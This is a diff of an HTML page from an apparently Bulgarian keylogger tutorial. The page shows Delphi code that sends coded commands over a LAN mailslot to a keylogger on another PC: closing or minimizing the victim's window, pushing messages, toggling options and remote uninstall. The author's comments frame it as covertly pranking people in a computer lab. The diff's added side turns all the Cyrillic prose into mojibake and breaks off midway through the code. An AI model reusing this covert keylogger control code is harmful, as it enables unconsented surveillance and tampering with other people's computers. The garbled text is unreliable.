@@ -1,221 +1,221 @@
-<html>
-<head>
-<title>Keylogger - Send through LAN</title>
-<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
-</head>
-
-<body bgcolor="#666666" text="#CCCCCC" link="#FFFFFF" vlink="#0000CC" alink="#0000FF">
-<p><font face="Courier New, Courier, mono">&nbsp;&nbsp;За някои може би ще е интересно 
-  как да направят програмите си да общуват през Lan. За целта аз използвах компонента 
-  <a href="http://www.alphalink.com.au/%7Eleigh/components">ALMailSlot</a>, които 
-  ще трябва и вие да си го свалите. Ако искате съвсем сам да си направите всичко 
-  можете да се консултирате с неговия сурс и да разберете как бачка mailslot в 
-  \/\/indows. Аз не съм се занимавал да го интегрирам в програмата, защото смятам, 
-  че така се изпуска възможността да се възползваме от хубавия компонент, който 
-  е направил човека. За да пращате нещо на някой ви трябва само името на компютъра 
-  (local machine) и текста, който сте измислили. Ето какво съм направил в програмата...</font></p>
-<table width="100%" border="1">
-  <tr> 
-    <td bgcolor="#000099"><font color="#CCCCCC" face="Courier New, Courier, mono">{tazi 
-      procedura se izvikva sled proverkata za hotword i proverqva dali sa pusnati 
-      GetPar1 ili GetPar2, za da dobavq <b>St</b> kum Par1(komputer) i Par2(komanda)}</font><font color="#FFFFFF" face="Courier New, Courier, mono"><br>
-      procedure</font><font color="#FFFF00" face="Courier New, Courier, mono"> 
-      CompileCmd; </font> 
-      <p><font color="#FFFF00" face="Courier New, Courier, mono"> <font color="#FFFFFF">procedure</font> 
-        SendCmd(<font color="#FFFFFF">const</font> APar1,APar2: <font color="#FFFFFF">string</font>);<br>
-        <font color="#CCCCCC">{Tuka se opravqt stringovete za izprashtane kum 
-        drugiq komputer. Mojete da vidite, 4e ne se izprashtat napravo vuvedenite 
-        ot vas komandi, a se izpolzvat oshte po sukrateni znaci za ukazvane na 
-        komandata}</font><font color="#FFFFFF"><br>
-        var</font><br>
-        &nbsp;&nbsp;i: Integer;<br>
-        &nbsp;&nbsp;par,par1: <font color="#FFFFFF">string</font>;<br>
-        <font color="#FFFFFF">begin</font><br>
-        &nbsp;&nbsp;par:=LowerCase(Copy(APar2,0,2));<br>
-        &nbsp;&nbsp;par1:=LowerCase(Copy(APar2,2,1));<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> par='w&amp;' <font color="#FFFFFF">then</font><br>
-        <font color="#CCCCCC">&nbsp;&nbsp;{tuk se kompilira komandata za smqna 
-        na imenata na prozorcite za prihvashtane. purvo se slaga &quot;l&quot; 
-        sledva nomera na izpratenite string-ove i sled tova sa izbroeni te}</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">for</font> i := 0 <font color="#FFFFFF">to</font> 
-        9 <font color="#FFFFFF">do</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Main.MailSlot1.SendMessage(Par1Str,Format('l%d%s',[i,WinLst[i]]))<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> <font color="#FFFFFF">begin</font><br>
-        <font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{Sega zapochvat 
-        ostanalite proverki za validna komanda. Eto i purviq elementaren primer. 
-        Ako ste vuveli ;cmd;pc01;b?; nashata programa shte izprati &quot;n&quot; 
-        na programata ni na PC01. Tq estestveno znae kakvo trqbva da pravi i vednaga 
-        izpulnqva nasheto &quot;razporejdane&quot; :) Vuv slu4aq se izprashta 
-        zapitvane dali e vkliuchena opciqta Beep, no tova estestveno generira 
-        i otgovor ot strana na logger-a na drugiq komputer i na vas vi izliza 
-        napr. &quot;Beep - enabled&quot;}</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='b?' 
-        <font color="#FFFFFF">then</font> par:='n';<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#CCCCCC">{sled tova mojete 
-        da smenite beep na drugiq komputer kato napishete ;cmd;pc01;b=0; . Programata 
-        prerabotva vashata zaqvka i izprashta o0 na PC01. Sukrashteniqta, koito 
-        se generirat, az sum gi napravil da sa ot po 1 bukva}</font><font color="#FFFFFF"><br>
-        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font><font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
-        par='b=' <font color="#FFFFFF">then</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par1='0' <font color="#FFFFFF">then</font> par:='o0'<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
-        par:='o1'<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='de' 
-        <font color="#FFFFFF">then</font> par:='a';<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='ex' 
-        <font color="#FFFFFF">then</font> par:='b';<br>
-        <font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{Ei tui cl shte 
-        izprati na drugiq keylogger &quot;c&quot; i ... Close Active Window. Onzi 
-        shte se chudi kakvo e stanalo, no ako e vuv vashata zala gledaite da ne 
-        se smeete mnogo da ne vi usetqt ;) }</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='cl' 
-        <font color="#FFFFFF">then</font> par:='c';<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='l?' 
-        <font color="#FFFFFF">then</font> par:='d';<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='l&amp;' 
-        <font color="#FFFFFF">then</font> par:=Format('e%d',[StrCount]);<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#CCCCCC">{Mojete da izpratite 
-        i suobshtenie nqkoi ot zalata. Naprimer vijdate nqkuv dreben deto qko 
-        zacukva Counter-Strike. Emi vednaga pishete ;cmd;dmem13;meEi dreben kakmo 
-        se pulish; i glei k'vo staa :DD}</font><font color="#FFFFFF"><br>
-        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font><font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
-        par='me' <font color="#FFFFFF">then</font> par:='f'+Copy(APar2,3,Length(APar2)-2);<br>
-        </font><font face="Courier New, Courier, mono">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#CCCCCC">{tova 
-        muk tuk mu minimizira activniq prozorec}</font><font color="#FFFF00"><font color="#FFFFFF"><br>
-        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font></font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font></font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono"><font color="#FFFF00"><font color="#FFFFFF">if</font> 
-        par='mi' <font color="#FFFFFF">then</font> par:='m';<br>
-        </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFF00"><font color="#FFFFFF">if</font> 
-        par='p?' <font color="#FFFFFF">then</font> par:='g';<br>
-        <font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</font> par='p=' 
-        <font color="#FFFFFF">then</font><br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par1='0' <font color="#FFFFFF">then</font> par:='h0'<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
-        par:='h1'<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par='re' <font color="#FFFFFF">then</font> par:='i';<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par='sh' <font color="#FFFFFF">then</font> par:='j';<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par='s?' <font color="#FFFFFF">then</font> par:='p';<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par='s=' <font color="#FFFFFF">then</font><br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
-        <font color="#FFFF00">&nbsp;&nbsp;&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par1='0' <font color="#FFFFFF">then</font> par:='q0'<br>
-        <font color="#FFFF00">&nbsp;&nbsp;&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
-        par:='q1'<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
-        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font></font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#CCCCCC">{remote 
-        uninstall brat4e}</font><font face="Courier New, Courier, mono"><font color="#FFFF00"><br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par='un' <font color="#FFFFFF">then</font> par:='k';<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par='w?' <font color="#FFFFFF">then</font> par:='r';<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par='w=' <font color="#FFFFFF">then</font><br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
-        par1='0' <font color="#FFFFFF">then</font> par:='s0'<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
-        par:='s1'<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
-        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font></font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#CCCCCC">{sled 
-        kato sme gotovi izprashtame suobshtenieto. tuka trqbva da se pravi i proverka 
-        na vremete zashtoto se poluchavat po 2-3 edni i sushti komandi na drugoto 
-        PC}</font><font face="Courier New, Courier, mono"><font color="#FFFF00"><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Main.MailSlot1.SendMessage(APar1,Format('%s%s',[TimeToStr(Time),par]));<br>
-        <font color="#FFFF00">&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#FFFFFF">end</font>;<br>
-        <font color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">end</font>;</font></font></p>
-      <p><font color="#FFFFFF" face="Courier New, Courier, mono">begin</font><font color="#FFFF00" face="Courier New, Courier, mono"><br>
-        <font color="#CCCCCC">&nbsp;&nbsp;{malko rabota sus Par1Str i Par2Str 
-        kogato imame BkSpace ili Space}</font><br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=' BkSp ') <font color="#FFFFFF">and</font> 
-        (GetPar1) <font color="#FFFFFF">then</font> Delete(Par1Str,Length(Par1Str),1);<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=' BkSp ') <font color="#FFFFFF">and</font> 
-        (GetPar2) <font color="#FFFFFF">then</font> Delete(Par2Str,Length(Par2Str),1);<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=' Space ') <font color="#FFFFFF">and</font> 
-        (GetPar1) <font color="#FFFFFF">then</font> Par1Str:=Par1Str+' ';<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=' Space ') <font color="#FFFFFF">and</font> 
-        (GetPar2) <font color="#FFFFFF">then</font> Par2Str:=Par2Str+' ';<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> Length(St)&gt;1 <font color="#FFFFFF">then</font> 
-        Exit;<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=';') <font color="#FFFFFF">and</font> 
-        (GetPar1) <font color="#FFFFFF">then</font><br>
-        <font color="#CCCCCC">&nbsp;&nbsp;{ako imame ; i e vkliuchen GetPar1 znachi 
-        vkliuchvame GetPar2, za da zapochnem da populvame sledvashtiq parametur 
-        - komandata}</font><br>
-        &nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;GetPar1:=false;<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;GetPar2:=true;<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> DoBeep <font color="#FFFFFF">then</font> 
-        MessageBeep(MB_OK);<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;Exit;<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> (St=';') <font color="#FFFFFF">and</font> 
-        (GetPar2) <font color="#FFFFFF">then</font><br>
-        <font color="#CCCCCC">&nbsp;&nbsp;{ako i nego go zapulnim izvikvame SendCmd 
-        i zarejdame LastCmd s novata komanta, za da mojem sled tova da polzvame 
-        ;repeat;}</font><br>
-        &nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;GetPar2:=false;<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> Par1Str='' <font color="#FFFFFF">then</font> 
-        Par1Str:=OldPar1<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
-        OldPar1:=Par1Str;<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;LastCmd.PCName:=Par1Str;<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;LastCmd.Msg:=Par2Str;<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;SendCmd(Par1Str,Par2Str);<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;Par1Str:='';<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;Par2Str:='';<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;Exit;<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> GetPar1 <font color="#FFFFFF">then</font> 
-        Par1Str:=Par1Str+St;<br>
-        &nbsp;&nbsp;<font color="#FFFFFF">if</font> GetPar2 <font color="#FFFFFF">then</font> 
-        Par2Str:=Par2Str+St;<br>
-        <font color="#FFFFFF">end</font>;</font></p>
-    </td>
-  </tr>
-</table>
-<p><font face="Courier New, Courier, mono"> &nbsp;&nbsp;Този mailslot е направо 
-  чудесен. Можете дори сега да си направите една програмка да изгаврите някой 
-  в залата.</font></p>
-<p><font face="Courier New, Courier, mono">&nbsp;&nbsp;Тъй като TMain.MailSlot1NewMessage 
-  (какво се прави при получаване на команда) си има коментари няма да я изкарвам 
-  тук. Забележете само:</font></p>
-<table width="100%" border="1">
-  <tr> 
-    <td bgcolor="#000099"> <font color="#FFFFFF" face="Courier New, Courier, mono">if</font> 
-      <font color="#FFFF00" face="Courier New, Courier, mono">Copy(Text,0,1)&lt;&gt;'l'</font> 
-      <font color="#FFFFFF" face="Courier New, Courier, mono">then</font><font face="Courier New, Courier, mono"><br>
-      <font color="#FFFFFF">begin</font><br>
-      <font color="#FFFFFF">&nbsp;&nbsp;if</font></font> <font color="#FFFF00" face="Courier New, Courier, mono">LastTime=Copy(Text,0,7)</font> 
-      <font color="#FFFFFF" face="Courier New, Courier, mono">then</font> <font color="#FFFF00" face="Courier New, Courier, mono">exit;<br>
-      </font> <font color="#FFFF00" face="Courier New, Courier, mono">&nbsp;&nbsp;LastTime:=Copy(Text,0,7);<br>
-      </font> <font color="#FFFF00" face="Courier New, Courier, mono">&nbsp;&nbsp;Delete(Text,0,7);</font><font face="Courier New, Courier, mono"><br>
-      <font color="#FFFFFF">end</font>;</font></td>
-  </tr>
-</table>
-<p><font face="Courier New, Courier, mono">&nbsp;&nbsp;Ето тук от получения Text 
-  си отрязваме времето на изпращане и проверяваме дали вече не сме го получавали 
-  веднъж. Щеше да има проблеми, ако две команди се изпратят за 1 сек, но не ми 
-  се вярва да успеете да напишете ;cmd;pc09;b?; и ;cmd;pc09;ex; за толкова кратко.</font></p>
-<table width="100%" border="0">
-  <tr> 
-    <td><font face="Courier New, Courier, mono"><a href="log2.htm">назад</a></font></td>
-    <td> 
-      <div align="center"><font face="Courier New, Courier, mono"><a href="logger.htm#view">начало</a></font></div>
-    </td>
-    <td> 
-      <div align="right"><font face="Courier New, Courier, mono">напред</font></div>
-    </td>
-  </tr>
-</table>
-</body>
-</html>
+<html>
+<head>
+<title>Keylogger - Send through LAN</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+
+<body bgcolor="#666666" text="#CCCCCC" link="#FFFFFF" vlink="#0000CC" alink="#0000FF">
+<p><font face="Courier New, Courier, mono">&nbsp;&nbsp;Р—Р° РЅСЏРєРѕРё РјРѕР¶Рµ Р±Рё С‰Рµ Рµ РёРЅС‚РµСЂРµСЃРЅРѕ 
+  РєР°Рє РґР° РЅР°РїСЂР°РІСЏС‚ РїСЂРѕРіСЂР°РјРёС‚Рµ СЃРё РґР° РѕР±С‰СѓРІР°С‚ РїСЂРµР· Lan. Р—Р° С†РµР»С‚Р° Р°Р· РёР·РїРѕР»Р·РІР°С… РєРѕРјРїРѕРЅРµРЅС‚Р° 
+  <a href="http://www.alphalink.com.au/%7Eleigh/components">ALMailSlot</a>, РєРѕРёС‚Рѕ 
+  С‰Рµ С‚СЂСЏР±РІР° Рё РІРёРµ РґР° СЃРё РіРѕ СЃРІР°Р»РёС‚Рµ. РђРєРѕ РёСЃРєР°С‚Рµ СЃСЉРІСЃРµРј СЃР°Рј РґР° СЃРё РЅР°РїСЂР°РІРёС‚Рµ РІСЃРёС‡РєРѕ 
+  РјРѕР¶РµС‚Рµ РґР° СЃРµ РєРѕРЅСЃСѓР»С‚РёСЂР°С‚Рµ СЃ РЅРµРіРѕРІРёСЏ СЃСѓСЂСЃ Рё РґР° СЂР°Р·Р±РµСЂРµС‚Рµ РєР°Рє Р±Р°С‡РєР° mailslot РІ 
+  \/\/indows. РђР· РЅРµ СЃСЉРј СЃРµ Р·Р°РЅРёРјР°РІР°Р» РґР° РіРѕ РёРЅС‚РµРіСЂРёСЂР°Рј РІ РїСЂРѕРіСЂР°РјР°С‚Р°, Р·Р°С‰РѕС‚Рѕ СЃРјСЏС‚Р°Рј, 
+  С‡Рµ С‚Р°РєР° СЃРµ РёР·РїСѓСЃРєР° РІСЉР·РјРѕР¶РЅРѕСЃС‚С‚Р° РґР° СЃРµ РІСЉР·РїРѕР»Р·РІР°РјРµ РѕС‚ С…СѓР±Р°РІРёСЏ РєРѕРјРїРѕРЅРµРЅС‚, РєРѕР№С‚Рѕ 
+  Рµ РЅР°РїСЂР°РІРёР» С‡РѕРІРµРєР°. Р—Р° РґР° РїСЂР°С‰Р°С‚Рµ РЅРµС‰Рѕ РЅР° РЅСЏРєРѕР№ РІРё С‚СЂСЏР±РІР° СЃР°РјРѕ РёРјРµС‚Рѕ РЅР° РєРѕРјРїСЋС‚СЉСЂР° 
+  (local machine) Рё С‚РµРєСЃС‚Р°, РєРѕР№С‚Рѕ СЃС‚Рµ РёР·РјРёСЃР»РёР»Рё. Р•С‚Рѕ РєР°РєРІРѕ СЃСЉРј РЅР°РїСЂР°РІРёР» РІ РїСЂРѕРіСЂР°РјР°С‚Р°...</font></p>
+<table width="100%" border="1">
+  <tr> 
+    <td bgcolor="#000099"><font color="#CCCCCC" face="Courier New, Courier, mono">{tazi 
+      procedura se izvikva sled proverkata za hotword i proverqva dali sa pusnati 
+      GetPar1 ili GetPar2, za da dobavq <b>St</b> kum Par1(komputer) i Par2(komanda)}</font><font color="#FFFFFF" face="Courier New, Courier, mono"><br>
+      procedure</font><font color="#FFFF00" face="Courier New, Courier, mono"> 
+      CompileCmd; </font> 
+      <p><font color="#FFFF00" face="Courier New, Courier, mono"> <font color="#FFFFFF">procedure</font> 
+        SendCmd(<font color="#FFFFFF">const</font> APar1,APar2: <font color="#FFFFFF">string</font>);<br>
+        <font color="#CCCCCC">{Tuka se opravqt stringovete za izprashtane kum 
+        drugiq komputer. Mojete da vidite, 4e ne se izprashtat napravo vuvedenite 
+        ot vas komandi, a se izpolzvat oshte po sukrateni znaci za ukazvane na 
+        komandata}</font><font color="#FFFFFF"><br>
+        var</font><br>
+        &nbsp;&nbsp;i: Integer;<br>
+        &nbsp;&nbsp;par,par1: <font color="#FFFFFF">string</font>;<br>
+        <font color="#FFFFFF">begin</font><br>
+        &nbsp;&nbsp;par:=LowerCase(Copy(APar2,0,2));<br>
+        &nbsp;&nbsp;par1:=LowerCase(Copy(APar2,2,1));<br>
+        &nbsp;&nbsp;<font color="#FFFFFF">if</font> par='w&amp;' <font color="#FFFFFF">then</font><br>
+        <font color="#CCCCCC">&nbsp;&nbsp;{tuk se kompilira komandata za smqna 
+        na imenata na prozorcite za prihvashtane. purvo se slaga &quot;l&quot; 
+        sledva nomera na izpratenite string-ove i sled tova sa izbroeni te}</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">for</font> i := 0 <font color="#FFFFFF">to</font> 
+        9 <font color="#FFFFFF">do</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Main.MailSlot1.SendMessage(Par1Str,Format('l%d%s',[i,WinLst[i]]))<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> <font color="#FFFFFF">begin</font><br>
+        <font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{Sega zapochvat 
+        ostanalite proverki za validna komanda. Eto i purviq elementaren primer. 
+        Ako ste vuveli ;cmd;pc01;b?; nashata programa shte izprati &quot;n&quot; 
+        na programata ni na PC01. Tq estestveno znae kakvo trqbva da pravi i vednaga 
+        izpulnqva nasheto &quot;razporejdane&quot; :) Vuv slu4aq se izprashta 
+        zapitvane dali e vkliuchena opciqta Beep, no tova estestveno generira 
+        i otgovor ot strana na logger-a na drugiq komputer i na vas vi izliza 
+        napr. &quot;Beep - enabled&quot;}</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='b?' 
+        <font color="#FFFFFF">then</font> par:='n';<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#CCCCCC">{sled tova mojete 
+        da smenite beep na drugiq komputer kato napishete ;cmd;pc01;b=0; . Programata 
+        prerabotva vashata zaqvka i izprashta o0 na PC01. Sukrashteniqta, koito 
+        se generirat, az sum gi napravil da sa ot po 1 bukva}</font><font color="#FFFFFF"><br>
+        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font><font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        par='b=' <font color="#FFFFFF">then</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par1='0' <font color="#FFFFFF">then</font> par:='o0'<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
+        par:='o1'<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">end</font>;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='de' 
+        <font color="#FFFFFF">then</font> par:='a';<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='ex' 
+        <font color="#FFFFFF">then</font> par:='b';<br>
+        <font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{Ei tui cl shte 
+        izprati na drugiq keylogger &quot;c&quot; i ... Close Active Window. Onzi 
+        shte se chudi kakvo e stanalo, no ako e vuv vashata zala gledaite da ne 
+        se smeete mnogo da ne vi usetqt ;) }</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='cl' 
+        <font color="#FFFFFF">then</font> par:='c';<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='l?' 
+        <font color="#FFFFFF">then</font> par:='d';<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> par='l&amp;' 
+        <font color="#FFFFFF">then</font> par:=Format('e%d',[StrCount]);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#CCCCCC">{Mojete da izpratite 
+        i suobshtenie nqkoi ot zalata. Naprimer vijdate nqkuv dreben deto qko 
+        zacukva Counter-Strike. Emi vednaga pishete ;cmd;dmem13;meEi dreben kakmo 
+        se pulish; i glei k'vo staa :DD}</font><font color="#FFFFFF"><br>
+        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font><font color="#CCCCCC">&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        par='me' <font color="#FFFFFF">then</font> par:='f'+Copy(APar2,3,Length(APar2)-2);<br>
+        </font><font face="Courier New, Courier, mono">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#CCCCCC">{tova 
+        muk tuk mu minimizira activniq prozorec}</font><font color="#FFFF00"><font color="#FFFFFF"><br>
+        </font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font></font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font></font><font color="#FFFF00" face="Courier New, Courier, mono"><font color="#CCCCCC">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono"><font color="#FFFF00"><font color="#FFFFFF">if</font> 
+        par='mi' <font color="#FFFFFF">then</font> par:='m';<br>
+        </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFF00"><font color="#FFFFFF">if</font> 
+        par='p?' <font color="#FFFFFF">then</font> par:='g';<br>
+        <font color="#FFFFFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</font> par='p=' 
+        <font color="#FFFFFF">then</font><br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">begin</font><br>
+        <font color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FFFFFF">if</font> 
+        par1='0' <font color="#FFFFFF">then</font> par:='h0'<br>
